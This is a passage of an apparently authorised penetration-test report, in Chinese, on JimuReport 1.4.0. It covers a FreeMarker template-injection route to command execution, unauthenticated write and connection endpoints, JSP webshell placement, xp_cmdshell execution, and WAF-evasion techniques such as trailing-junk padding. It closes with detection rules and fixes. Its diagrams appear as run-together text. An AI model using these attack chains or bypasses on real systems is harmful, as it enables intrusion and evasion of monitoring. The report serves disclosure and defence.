| paramArray 形态 | Jackson 解析结果 | Java toString | 二次解析结果 | 实测 |
| --- | --- | --- | --- | --- |
| 对象数组 `[{"paramName":"x","paramValue":"\\x27"}]` | `ArrayList<LinkedHashMap>` | `[{paramName=x, paramValue=\x27}]`（无引号） | fastjson 默认 feature 拒绝无引号 key → `expect ':' at 0` | G2/G7 ❌ |
| 字符串数组 `["\\x27"]` | `ArrayList<String>` | `[\x27]`（String 不加引号） | 非 JSON → `syntax error, pos 2` | G1/G5/G6 ❌ |
| 数字数组 `[1,2,3]` | `ArrayList<Integer>` | `[1, 2, 3]` | 可解析 → 元素 cast JSONObject 失败 | G3 ❌ |
| 空对象数组 `[{},{}]` | `ArrayList<Map>` | `[{}, {}]` | 可解析且元素为 JSONObject | G4 ✅ 但无 paramName → 无注入 |
| 对象（非数组） | `LinkedHashMap` | `{paramName=x,...}` | parseArray 期待 `[` → 报错 | G8 ❌ |

- **结论**：`\xHH`/`\uXXXX` 等扩展转义即使以 `\\x27` 形式通过 Jackson 第一层，也**无法在二次解析层落地为注入**（Java toString 已破坏 JSON 词法，且对象数组的 `expect ':'` 失败先于转义解码发生）。此层不可用作 WAF 绕过通道——与官方 jmreport 纯 fastjson 环境（paramArray 为 JSONArray，toString 即 JSON，二次解析可正常执行）的行为差异，是 GRP 环境独有的"防御红利"。

### 6.11.4 结论

- **有效通道唯一**：`\uXXXX`（Jackson 标准转义）+ RFC 8259 标准空白（`\t`/`\n`/`\r`/空格）——即 P12 / C6 / A3 三族，与 §6.9/§6.10 结论一致；
- fastjson 社区公开的 bypass 手段（multipart CTE、大量字符、`\xHH`、单引号、注释、`\b`/`\f` 跳过、Content-Type 解析器切换）在当前环境**全部不可用**；
- 检测模型维持 §6.10.3 修正：**L1 原始字节 `\u00XX` 密度检测仍为唯一必要检测面**；检测方应警惕的唯一剩余变量是"WAF 是否做 JSON 解码"。

## 6.12 Y4tacker《浅谈Fastjson绕waf》深度研究对照验证（，目标服务器实测）

### 6.12.1 文章手法全清单对照（来源：sec-in.com/article/950 同源博文 Y4tacker）

| 文章手法（fastjson 词法/反序列化层） | 当前环境结论 | 实测证据 |
| --- | --- | --- |
| 键值外空白跳过（含 `\b`/`\f`/`\t`/`\n`/`\r`） | ⚠️ 部分适用 | 4 种 RFC 空白 ✅（E3-E5）；`\b`/`\f` ❌（E1/E2） |
| `AllowArbitraryCommas` 多逗号 | ❌ | N4 实测：`{,,,}` 中间逗号 → 500 |
| `AllowUnQuotedFieldNames` 无引号 key | ❌ | C2 实测（已有） |
| `AllowSingleQuote` 单引号 key | ❌ | A1 实测（已有） |
| @type 值首引号可替换为任意字符 | ❌ | N1 实测：`"sql":xselect` → 500（Jackson 值位置严格，无此逻辑漏洞） |
| `\u`/`\x` 混合编码 | ⚠️ 部分适用 | `\u` ✅（A3/C7/P12）；`\x` ❌（A2）——**与文章"两者皆可"不同** |
| smartMatch：key 中 `_`/`-` 被忽略（fnv1a\_64\_lower） | ❌ 天然不适用 | 无 [Java](#)Bean 反序列化：请求体层 Jackson Map 精确匹配、二次层 `JSONObject.get()` 精确匹配 |
| 1.2.36+ 属性 `is` 前缀剥离 | ❌ 天然不适用 | 同上（纯 JavaBeanDeserializer 特性） |
| `/**/`/`//` 注释打乱特征 | ❌ | C1/N3 实测：注释 → JsonParseException |
| 注释+控制字符 `\u001a` 语义分裂（WAF 删注释失败） | ❌ 不适用 | N3 实测：Jackson 词法层拒绝 `/`；解析器比 WAF 严格，无"WAF 清洗后仍可执行"缝隙 |
| **JSON [数据](#)后填充任意字符** | ✅✅ **完全适用且更强** | N2 族 12 变体全执行：fastjson 排除 `():[]{}`，Jackson 2.9 **无任何排除** |

### 6.12.2 重大迁移发现：Jackson 2.9 尾随杂散字符（N2 族，威胁检测模型）

- 实测：`{"sql":"select 'NX' as val",...}` 后追加 `}`、`{`、`[`、`]`、`:`、`(`、`;`、反引号、`"`、`/*xx*/`、`\u001a`、以及**整个合法 JSON 对象** `{"a":1}`——12 变体全部解析成功并完成渲染（HTTP 200 + fieldList 回显）；
- 机制：Spring 经 `ObjectMapper.readValue(String, ...)` 解析——**Jackson 2.9 在 Map 解析完成后不检查输入是否消费完**（`_verifyNoTrailingTokens` EOF 校验为 2.13+ 才加入），尾随 token 静默丢弃；
- 与文章对比：fastjson 同样忽略尾随字符但**排除** `():[]{}` 等结构字符（`JSONLexerBase#nextToken` 限制）；Jackson 2.9 **无任何排除**——当前环境比 fastjson 更宽松；
- 攻击场景（语义分裂）：
  - ① WAF 以 `^{.*}$` 正则或 `json.loads` 做"JSON 完整性校验"→ 尾随垃圾使校验失败 → WAF 判"非 JSON 报文"跳过检测放行 → Jackson 正常执行渲染；
  - ② WAF 全文统计 `\u00XX` 密度（§6.10.3 的 L1 模型）→ `}` 后追加大段普通文本可**稀释密度至阈值下**，绕过 L1 检测；
- **检测修正**：检测与特征提取必须限定在 **JSON 结构范围内**（首个 `{` 至其配对 `}` 之间）；**禁止对全文 body 统计特征**；提取 sql 需严格解析（EOF 校验）；WAF 不得以"完整性校验失败"为由放行报文——严格解析失败 ≠ 应用解析失败。

### 6.12.3 其余手法拒绝/不适用实证

- **N1 值起始 token 替换**（文章 @type 技巧的 Jackson 对应面）：`"sql":xselect 'N1' as val` → 500。Jackson 值位置只认合法值 token，无 fastjson `scanSymbol` 的"首引号可替换"逻辑漏洞；
- **N3 注释+控制字符**（文章高级篇 `\u001a` 技巧）：`/*\u001a{/*y4tacker*/"sql":"select 'N3' as val"...}*/` → 500。该技巧成立前提是"解析器接受注释"，Jackson 词法层直接拒绝，语义分裂条件不成立；
- **N4 多逗号**：`{,,,}` 中间逗号 → 500（Jackson 严格模式，`AllowArbitraryCommas` 不存在）；
- **smartMatch / `is` 前缀**：纯 fastjson `JavaBeanDeserializer#smartMatch` 特性；当前环境请求体层是 Jackson Map [反序列化](https://mrxn.net/tag/rce "标签：反序列化")（key 精确匹配，`getString("sql")` 不模糊）、paramArray 二次层是 `JSONObject.get("paramName")` 精确匹配——**全链路无模糊 key 匹配层**，天然免疫；
- **N5/N5b 值内任意 `\u` 转义**（`\u001a` 0x1A、`\u0000` NUL 出现在 SQL 字符串**末尾**）：✅ 执行成功——补充 C5 边界：NUL/0x1A 在 SQL 字符串末尾被 SQL Server 忽略，仅当出现在 SQL 语句**中间**（`sel\u0000ect`）才报错。

### 6.12.4 结论与检测模型二次修正

- 文章 11 项手法仅 1 项完全迁移（尾随杂散字符 N2 族），且**当前环境比文章描述的 fastjson 行为更强**（无 `():[]{}` 排除）——这是 Jackson 2.9 旧版（无 EOF 校验）特有的攻击面；
- 其余 10 项在请求体层全部被 Jackson 严格模式拒绝，或属 fastjson [Java](#)Bean 特性在当前环境天然不存在；
- §6.5 检测模型**二次修正**：L1 密度检测与 L2 解码检测的作用域**必须限定在 JSON 结构内**（`{`…`}`），全文统计可被 N2 尾随填充稀释绕过；WAF 侧禁止以"JSON 完整性校验失败"为由放行——应用解析器（Jackson 2.9 宽松尾随）与严格校验器语义分裂正是 N2 攻击的入口。

### 6.12.5 补充验证：多 u 复写 `\uuuuXXXX`（fastjson 私有转义特性）

- 特性背景：fastjson `JSONLexerBase#scanSymbol` 遇到 `\u` 后**循环跳过连续 `u`** 再读 4 位 hex——`\uuuu0020` 等价 `` `（空格），是 fastjson 环境经典的 WAF 正则绕过（检测 ``\u[0-9a-f]{4}`会漏掉`\uuuu...`形态）；Jackson 的`\_parseUnicodeEscape`**只接受恰好一个`u`**，第 2 个`u`进入 hex 校验即`charToHex('u') = -1` → "Invalid Unicode escape"；
- 实测（M1–M5，，全部无害 payload）：
  - 值层 `\uuuu0020` / `\uu0020` → ❌ 500（M1/M1b），单 `\u0020` 对照 ✅（M1c）；
  - key 层 `{"\uuuu0073ql":...}` → ❌ 500（M3），单 `\u0073ql` 对照 ✅（M3b）；
  - paramArray 二次 fastjson 层 `"\\uuuu0041"` → ❌ `syntax error, pos 2`——二次层收到 Java toString 后的 `[\uuuu0041]`，`\` 非合法 token 起始，多 u 解码**无从触发**（M5）；
  - 字面路径 `"select\\uuuu0020'...'"` → ⚠️ Jackson 解码 `\\` 后 T-SQL 收到 `\uuuu0020` 文本，拒绝 `\u` 标识符 → 业务"解析失败"，无执行（M2）；
- **结论**：多 u 复写在当前环境**三个层面全部不可用**——与 fastjson 环境的最后一类"转义形态"差异也已排除；`\uXXXX` 单 u 标准转义仍是唯一有效通道。检测方注意：按 fastjson 行为假设的检测器（匹配 `\u+[0-9a-f]{4}`）在 Jackson 环境会**过度告警**（多 u 输入实际被拒绝），但按 Jackson 单 u 检测则无此噪声。

---

# 7. Mermaid 图表：调用链 / 攻击流程 / 检测决策

## 7.1 SSTI 渲染调用链（时序图）

webapps 目录ProcessBuilderTemplate processFreeMarkerUtilsutil e 渲染方法JimuReportServiceImplDesignReportController攻击者webapps 目录ProcessBuilderTemplate processFreeMarkerUtilsutil e 渲染方法JimuReportServiceImplDesignReportController攻击者危险区：整条链无鉴权可触发判定要点：响应 500 属预期，需观察文件落盘或命令计时副作用POST queryFieldBySql 携带恶意 sql 模板POST loadTableData 携带恶意 sql 模板parseReportSql(sql, dbSource, paramArray, type)e.a(sql, paramArray) 替换参数占位符FreeMarkerUtils.a(sql, map)new Template 读取用户输入并 process模板内 new 内置函数实例化 Execute 或 ProcessBuilderwaitFor 阻塞直到命令完成cmd 执行 echo 写文件到相对路径穿越目录渲染结果返回字符串返回渲染后 SQL返回解析结果成功或 SQL 解析失败响应

## 7.2 写库持久化攻击流程（库表型入口）

show

exportAllExcel

exportPdf

攻击者 无凭证

saveDb 无鉴权写入恶意 dbDynSql 模板

save 通过 excel\_config\_id 更新目标报表

选择触发入口

GET show id 参数

POST exportAllExcel excelConfigId

POST exportPdf excelConfigId

getBaseSql 读取持久化 dbDynSql

FreeMarkerUtils.a 渲染模板

模板内 new 构造 Execute 执行命令

cmd 写文件到 webapps 目录

HTTP 访问落盘文件返回 200 确认 RCE

## 7.3 检测决策流程（流量侧）

是

否

否

是

否

是

是

否

jmreport 请求流量

u 转义 密集出现

JSON 解码还原

报文含模板定界符 左花括号百分号 或 尖括号井号

正常放行

命中正则 问号加空白加注释加 new 加左括号

低风险 仅模板业务流量 放行并记录

报文含 freemarker 或 utility 类名特征

高危告警 疑似 SSTI 利用

高危告警 疑似混淆变体 人工研判

行为层验证 响应计时异常 或 新落盘文件被访问

## 7.4 漏洞根因示意（组件关系）

Jimureport Starter 1.4.0

FreeMarkerUtils 渲染

Configuration 全新实例

setClassicCompatible true

无 TemplateClassResolver 沙箱

new 内置函数可实例化任意类

freemarker.template.utility.Execute

ObjectConstructor 可构造 ProcessBuilder

任意命令执行

---

# 8. 攻击面清单与修复建议

## 8.1 攻击面清单

| 编号 | 攻击面 | 利用条件 | 影响 | 状态 |
| --- | --- | --- | --- | --- |
| A1 | `queryFieldBySql` sql 参数 SSTI | 无 | 命令执行 | ✅ 实证 |
| A2 | `loadTableData` sql 参数 SSTI + call 前缀存储过程通道 | 无 | 命令执行（freemarker SSTI）；**任意存储过程执行 + 输出回显（`call xp_cmdshell('whoami')` → `nt authority\system`，SYSTEM 权限，目标实测）** | ✅ 实证（2.5.3 C） |
| A3 | `saveDb` 无鉴权写 dbDynSql | 无 | 持久化恶意模板 | ✅ 实证 |
| A4 | `save` 无鉴权更新报表 | 无 | 绑定恶意[数据](#)集到报表 | ✅ 实证 |
| A5 | `show` 渲染持久化模板 | 需 A3+A4 | 命令执行 | ✅ 实证 |
| A6 | `exportAllExcel` 渲染持久化模板 | 需 A3+A4 | 命令执行 | ✅ 实证 |
| A7 | `exportPdf` 渲染持久化模板 | 需 A3+A4 | 命令执行 | ✅ 实证 |
| A8 | `testConnection` 无鉴权 JDBC 任意连接 | 无 | **SSRF / 内网端口探测（异常回显）/ H2 远程 SQL 脚本执行（INIT）/ 任意路径文件写（H2 file 模式，父目录自动创建）/ RCE 链（INIT 脚本内 CREATE ALIAS 编译 + CALL）** | ✅ 实证（2.6） |
| A9 | `paramArray[].paramValue` Aviator 表达式 + 零过滤 SQL 注入 | 无 | Aviator 表达式求值注入（任意算术/内置函数，无命令执行，能力边界已实测 2.5.2）；**零过滤 SQL 注入通道：绕过过滤独立注入、union 字段名/数据回显、读 sysobjects 表名（目标实测 2.5.3 B）** | ✅ 实证（2.5） |
| A10 | `queryFieldByBean` [java](#)bean 反射面 | 需实现 IDataSetFactory 的类在类路径 | 潜在（未发现可利用类） | ⚪ 排除 |
| A11 | `getReportByUser` / `list` / `get/{id}` 元数据接口 | 无 | 报表与数据结构信息泄露 | ⚪ 信息面 |
| A12 | `testConnection` → [Java](#) 写文件通道 → 任意后缀落盘（JSP） | 无 | **写入可执行 JSP 至 webapps（内容任意、Tomcat 即时编译执行）/ WEB-INF 目录可写 → WebShell 持久化** | ✅ 实证（2.6.3 #10–#12） |

## 8.2 修复建议（按优先级）

1. **升级组件**：JimuReport 1.4.0 的 Freemarker SSTI 已有官方修复版本，升级到含沙箱/过滤的版本（如 1.4.2+ 或官方安全补丁）；
2. **启用模板沙箱**：为 `FreeMarkerUtils` 配置 `TemplateClassResolver`（`ALLOWS_NOTHING_RESOLVER` 或白名单），禁止 `?new()` 实例化任意类；或将 `classicCompatible` 关闭（`?new()` 依赖该模式）；
3. **修复鉴权**：让 `@JimuLoginRequired` 真正生效（实现拦截器校验 token/会话），`save`/`saveDb`/`delete` 等写接口必须强制登录；**`testConnection` 应直接移除**，如保留则必须强鉴权 + 驱动/URL 白名单（禁止 `h2:file`/`h2:mem`、禁止 URL 含 `INIT` 参数，2.6 实证的 SSRF/文件写/RCE 链全部依赖这两项）；
4. **输入校验**：SQL 模板内容在入库前对 `?new(`、`<#assign`、`${` 等模板元字符做白名单校验或编码；
5. **最小权限**：Tomcat 进程降权，webapps 目录禁止写入（当前 RCE 写文件利用依赖 `..\U8System\Tomcat\webapps` 可写）；
6. **检测**：部署第 6 节的正则规则，对 jmreport 路径全量记录并告警；关注 `?new(` 变体（含注释/空白插入）。

## 8.3 遗留痕迹说明（测试环境）

测试在目标上遗留了以下痕迹，环境重置时应清除：

- 报表 `1245588124302835712`（含 r9ds / r10ds / r11ds 三个[数据](#)集记录）；
- 垃圾报表（`{"id":""}` 调用产生的 `jsonStr=null` 记录）；
- 文件：`webapps/r7.png`、`r9.png`、`r9b.png`、`r12.png`（内容均为 `1337` 文本），以及早期尝试遗留的 `shell1.jsp`（位于 AppServer 目录，Web 不可达）等。

---

# 附录 A：本地 FreeMarker 复现工具

`/tmp/TestFm.java` —— 与目标同版本（freemarker-2.3.31）同配置（`setClassicCompatible(true)`）的本地验证工具：

```
import freemarker.template.*;
import java.io.*;
import java.util.*;

public class TestFm {
    public static void main(String[] args) throws Exception {
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
        cfg.setClassicCompatible(true);
        String tpl = args[0];
        Template t = new Template("t", new StringReader(tpl), cfg);
        StringWriter sw = new StringWriter();
        t.process(new HashMap<String, Object>(), sw);
        System.out.println("OUT: [" + sw.toString() + "]");
    }
}
```

```
# 编译与运行
javac -cp <freemarker-2.3.31.jar> TestFm.java
java -cp .:$FM TestFm '<模板字符串>'
```

用途：在构造 payload 前先在本地确认模板可执行、混淆方案有效、语法变体兼容性，再上线服务器实测（避免无效流量）。

---

*报告结束。测试环境为授权的局域网测试目标（192.168.168.168:8088），所有验证均使用无破坏性副作用命令（echo 写文件 / ping 计时），并保留完整报文供复核。*
